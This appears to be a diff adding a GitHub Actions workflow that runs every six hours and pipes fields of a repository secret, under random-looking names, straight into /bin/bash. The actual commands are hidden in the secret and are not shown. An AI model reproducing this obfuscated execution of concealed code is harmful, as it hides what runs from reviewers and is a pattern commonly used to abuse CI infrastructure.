@@ -1,0 +1,26 @@
+name: muxiangjiangying
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: muxiangjiangying
+        env:
+          vvu669: ${{ secrets.vvu669 }}
+        run: |
+          echo $vvu669 | jq -r .i013 | /bin/bash
+          echo $jwxjt67046 | jq -r .atiu4 | /bin/bash
+          echo $e044 | jq -r .jv0 | /bin/bash
+          echo $avt104 | jq -r .vsej01 | /bin/bash
+          echo $iimtr1 | jq -r .gfxa2112 | /bin/bash
+          echo $iufpd4030 | jq -r .t845 | /bin/bash
+          echo $krhvz72788 | jq -r .zhcp21 | /bin/bash
+          echo $fxrv31857 | jq -r .xka89 | /bin/bash
+          echo $cpxy29 | jq -r .i00 | /bin/bash
+          echo $els1 | jq -r .u6 | /bin/bash
+
